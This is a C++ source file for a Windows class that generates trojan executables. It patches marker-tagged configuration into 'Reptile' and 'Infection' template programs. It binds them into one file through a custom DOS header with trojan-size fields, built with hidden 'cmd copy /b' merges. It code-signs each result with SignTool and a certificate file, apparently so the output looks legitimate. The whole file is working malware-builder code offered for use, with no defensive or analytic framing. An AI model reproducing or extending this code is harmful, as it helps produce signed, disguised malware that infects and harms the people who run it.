#include "StdAfx.h"
#include "GenUTransmission.h"

CGenUTransmission::CGenUTransmission(void)
{
	ZeroMemory(m_szToolPath, sizeof(m_szToolPath));
}

CGenUTransmission::~CGenUTransmission(void)
{
}



int CGenUTransmission::Generate(LPSTR lpReptile, LPSTR lpInject, LPSTR lpStrOutPut)
{
	if (NULL == lpReptile || NULL == lpInject || NULL == lpStrOutPut)
	{
		return ERR_GENERATE_LEAKFILE;
	}
	
	//字符串赋值
	m_strExt = lpReptile;
	m_strOutput = lpInject;

	//初始化路径信息
	char szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, sizeof(szFileName));
	LPSTR lpPos = strrchr(szFileName, '\\');
	if (0 == lpPos || lpPos-szFileName > lstrlen(szFileName))
	{
		return ERR_GENERATE_LEAKFILE;
	}
	*lpPos = 0;

	//初始化工具目录
	ZeroMemory(m_szToolPath, sizeof(m_szToolPath));
	wsprintf(m_szToolPath, "%s\\runtime\\", szFileName);

	char szExeHead[MAX_PATH] = {0};
	char szInfection[MAX_PATH] = {0};
	char szReptile[MAX_PATH] = {0};
	char szReptileNew[MAX_PATH] = {0};
	char szBindHead[MAX_PATH] = {0};
	char szInfectionNew[MAX_PATH] = {0};
	char szOutput[MAX_PATH] = {0};

	wsprintf(szExeHead, "%sEXEHead.exe", m_szToolPath);
	wsprintf(szInfection, "%sInfection.exe", m_szToolPath);
	wsprintf(szInfectionNew, "%sInfectionnew_%d.exe", m_szToolPath, GetTickCount());

	wsprintf(szReptile, "%sReptile.exe", m_szToolPath);
	wsprintf(szReptileNew, "%sReptilenew_%d.exe", m_szToolPath, GetTickCount());
	wsprintf(szBindHead, "%sBindHead_%d.exe", m_szToolPath, GetTickCount());

	//替换爬取程序配置信息
	BOOL bRet = ReplaceConfigReptile(szReptile, szReptileNew);
	if (!bRet)
	{
		return ERR_GENERATE_REPLACECONFIG;
	}

	//签名爬取程序
	bRet = SingFile(szReptileNew);
	if (!bRet)
	{
		return ERR_GENERATE_SIGN;
	}

	//替换感染程序配置信息
	bRet = ReplaceConfigInfect(szInfection, szInfectionNew);
	if (!bRet)
	{
		return ERR_GENERATE_REPLACECONFIG;
	}

	//生成捆绑头文件
	bRet = GenerateExeBindFile(szExeHead, szReptileNew, szBindHead);
	if (!bRet)
	{
		return ERR_GENERATE_EXEHEAD;
	}

	//合并两个临时文件为最终文件
	bRet = GenerateLastFile(szBindHead, szInfectionNew, lpStrOutPut);
	if (!bRet)
	{
		return ERR_GENERATE_BINDFILE;
	}

	//签名输出程序
	bRet = SingFile(lpStrOutPut);
	if (!bRet)
	{
		return ERR_GENERATE_SIGN;
	}

	//删除临时文件
	DeleteFile(szReptileNew);
	DeleteFile(szBindHead);
	DeleteFile(szInfectionNew);

	return ERR_GENERATE_OK;
}



BOOL CGenUTransmission::GenerateExeBindFile(LPCTSTR strExeHead, LPCTSTR strMumaFile, LPCTSTR strOutputFile)
{
	if (NULL == strExeHead || NULL == strMumaFile || NULL == strOutputFile)
	{
		return FALSE;
	}

	BOOL bRet = FALSE;
	HANDLE hHeader  = INVALID_HANDLE_VALUE;
	HANDLE hMuma = INVALID_HANDLE_VALUE;
	DWORD dwAlign = 0;
	do 
	{
		hHeader = CreateFile(strExeHead, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
		if (INVALID_HANDLE_VALUE == hHeader)
		{
			break;
		}
		DWORD dwExeHeadSize = GetFileSize(hHeader, NULL);

		hMuma = CreateFile(strMumaFile, GENERIC_READ, FILE_SHARE_READ , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
		if (INVALID_HANDLE_VALUE == hMuma)
		{
			break;
		}

		DWORD dwMumaSize = GetFileSize(hMuma, NULL);

		//修改Exehead内容
		dwAlign = 512 - (dwMumaSize % 512);
		dwAlign = dwAlign == 512 ? 0 : dwAlign;

		MY_DOS_HEADER myDosHeader = {0};
		DWORD dwRead = 0;
		BOOL bRetFile = ReadFile(hHeader, &myDosHeader, sizeof(myDosHeader), &dwRead, NULL);
		if (!bRetFile)
		{
			break;
		}

		myDosHeader.selfFileSize = dwExeHeadSize;
		myDosHeader.trojanFileSize = dwMumaSize;
		myDosHeader.trojanAlignSize = dwAlign;

		SetFilePointer(hHeader, 0, NULL, FILE_BEGIN);

		DWORD dwWrite = 0;
		bRetFile = WriteFile(hHeader, &myDosHeader, sizeof(myDosHeader), &dwWrite, NULL);
		if (!bRetFile && dwWrite != sizeof(myDosHeader))
		{
			break;
		}

		bRet = TRUE;
	} while (FALSE);

	SAFE_CLOSE_FILE(hHeader);
	SAFE_CLOSE_FILE(hMuma);

	if (!bRet)
	{
		return bRet;
	}

	bRet = MergeFile(strExeHead, strMumaFile, strOutputFile);
	if (!bRet)
	{
		return bRet;
	}

	//处理内存对齐
	BYTE *lpWrite = NULL;
	do 
	{
		if (0 != dwAlign)
		{
			hHeader = CreateFile(strOutputFile, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
			if (INVALID_HANDLE_VALUE == hHeader)
			{
				break;
			}	

			SetFilePointer(hHeader, 0, NULL, FILE_END);
			lpWrite = new BYTE[dwAlign];
			::ZeroMemory(lpWrite, dwAlign);

			DWORD dwWrite = 0;
			BOOL bFile = WriteFile(hHeader, lpWrite, dwAlign, &dwWrite, NULL);
			if (!bFile && dwWrite != dwAlign)
			{
				break;
			}
		}

	} while (FALSE);

	SAFE_CLOSE_FILE(hHeader);	
	SAFE_DELARRAY(lpWrite);

	return TRUE;
}


BOOL CGenUTransmission::ReplaceConfigInfect(LPCTSTR strFileSrc, LPCTSTR strFileDes)
{
	if (NULL == strFileSrc || NULL == strFileDes)
	{
		return FALSE;
	}

	//copy一份文件进行修改
	BOOL bRet = CopyFile(strFileSrc, strFileDes, FALSE);
	if (!bRet)
	{
		return FALSE;
	}

	bRet = FALSE;
	BYTE *lpBuf = NULL;
	HANDLE hFile = CreateFile(strFileDes, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}

	do 
	{		
		DWORD dwSizeHigh = 0;
		DWORD dwSizeLow = ::GetFileSize(hFile, &dwSizeHigh);
		if (0 == dwSizeLow || dwSizeHigh > 0)
		{			
			break;
		}

		lpBuf = new BYTE[dwSizeLow];
		DWORD dwRead = 0;
		bRet = ReadFile(hFile, lpBuf, dwSizeLow, &dwRead, NULL);
		if (!bRet)
		{
			break;
		}

		DWORD dwSize = GetFileSize(hFile, NULL);

		static char szOutPath[] = {"IUJMNHYTGBVFRRF|"};

		LPBYTE lpBufBak = lpBuf;

		for (DWORD i=0; i<dwSize-16; i++)
		{			
			if (0 == memcmp(lpBufBak, szOutPath, 16))
			{
				memcpy(lpBufBak+16, m_strOutput, lstrlen(m_strOutput));
			}

			lpBufBak++;
		}

		SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
		bRet = WriteFile(hFile, lpBuf, dwSizeLow, &dwRead, NULL);	

	}while (FALSE);

	SAFE_CLOSE_FILE(hFile);
	SAFE_DELARRAY(lpBuf)

		return bRet;
}


BOOL CGenUTransmission::ReplaceConfigReptile(LPCTSTR strFileSrc, LPCTSTR strFileDes)
{
	if (NULL == strFileSrc || NULL == strFileDes)
	{
		return FALSE;
	}

	//copy一份文件进行修改
	BOOL bRet = CopyFile(strFileSrc, strFileDes, FALSE);
	if (!bRet)
	{
		return FALSE;
	}

	bRet = FALSE;
	BYTE *lpBuf = NULL;
	HANDLE hFile = CreateFile(strFileDes, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}

	do 
	{		
		DWORD dwSizeHigh = 0;
		DWORD dwSizeLow = ::GetFileSize(hFile, &dwSizeHigh);
		if (0 == dwSizeLow || dwSizeHigh > 0)
		{			
			break;
		}

		lpBuf = new BYTE[dwSizeLow];
		DWORD dwRead = 0;
		bRet = ReadFile(hFile, lpBuf, dwSizeLow, &dwRead, NULL);
		if (!bRet)
		{
			break;
		}

		DWORD dwSize = GetFileSize(hFile, NULL);

		static char szExtNmae[] = {"AQSEDRWFTGYHBVC|"};

		LPBYTE lpBufBak = lpBuf;

		for (DWORD i=0; i<dwSize-16; i++)
		{		
			if(0 == memcmp(lpBufBak, szExtNmae, 16))
			{
				memcpy(lpBufBak+16, m_strExt, lstrlen(m_strExt));
			}

			lpBufBak++;
		}

		SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
		bRet = WriteFile(hFile, lpBuf, dwSizeLow, &dwRead, NULL);	

	}while (FALSE);

	SAFE_CLOSE_FILE(hFile);
	SAFE_DELARRAY(lpBuf)

		return bRet;
}


BOOL CGenUTransmission::GenerateLastFile(LPCTSTR strExeBind, LPCTSTR strMumaFile, LPCTSTR strOutputFile)
{
	if (NULL == strExeBind || NULL == strMumaFile || NULL == strOutputFile)
	{
		return FALSE;
	}

	HANDLE hMuma = CreateFile(strMumaFile, GENERIC_READ, FILE_SHARE_READ , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hMuma)
	{
		return FALSE;
	}

	DWORD dwSize = GetFileSize(hMuma, NULL);
	CloseHandle(hMuma);

	HANDLE hExeBind = CreateFile(strExeBind, GENERIC_READ, FILE_SHARE_READ , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hExeBind)
	{
		return FALSE;
	}

	DWORD dwSizeExeBind = GetFileSize(hExeBind, NULL);
	CloseHandle(hExeBind);

	BOOL bRet = MergeFile(strMumaFile, strExeBind, strOutputFile);
	if (!bRet)
	{
		return bRet;
	}

	//修改文件头
	bRet = FALSE;
	HANDLE hFile = CreateFile(strOutputFile, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return bRet;
	}

	do 
	{
		MY_DOS_HEADER myDosHeader = {0};
		DWORD dwRead = 0;
		BOOL bRead = ReadFile(hFile, &myDosHeader, sizeof(myDosHeader), &dwRead, NULL);
		if (!bRead || sizeof(myDosHeader) != dwRead)
		{
			break;
		}

		SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
		myDosHeader.selfFileSize = dwSize;
		myDosHeader.trojanFileSize = dwSizeExeBind;

		bRead = WriteFile(hFile, &myDosHeader, sizeof(myDosHeader), &dwRead, NULL);
		if (!bRead || sizeof(myDosHeader) != dwRead)
		{
			break;
		}

		bRet = TRUE;

	}while(FALSE);

	CloseHandle(hFile);

	return bRet;
}



BOOL CGenUTransmission::MergeFile(LPCTSTR strFileHead, LPCTSTR strFileEnd, LPCTSTR strOutputFile)
{
	//两个文件合并
	STARTUPINFO si = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = {0};

	TCHAR szSysPath[MAX_PATH] = {0};
	GetSystemDirectory(szSysPath, sizeof(szSysPath)*sizeof(TCHAR));

	TCHAR szCmd[MAX_PATH * 3] = {0};
	wsprintf(szCmd, "%s\\cmd.exe /c copy \"%s\"/b + \"%s\"/b \"%s\"", szSysPath, strFileHead, strFileEnd, strOutputFile);

	if (!::CreateProcess(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) 
	{	
		return FALSE;
	}

	::WaitForSingleObject(pi.hProcess ,INFINITE);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return TRUE;
}


BOOL CGenUTransmission::SingFile(LPCTSTR strFileName)
{
	STARTUPINFO si = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = {0};

	TCHAR szSysPath[MAX_PATH] = {0};


	TCHAR szCmd[MAX_PATH * 3] = {0};
	
	wsprintf(szCmd, "%sSignTool.exe sign /v /ac %sMS_XS.cer /s my /t http://timestamp.verisign.com/scripts/timstamp.dll \"%s\"", m_szToolPath, m_szToolPath, strFileName);

	if (!::CreateProcess(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) 
	{	
		return FALSE;
	}

	::WaitForSingleObject(pi.hProcess ,INFINITE);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return TRUE;
}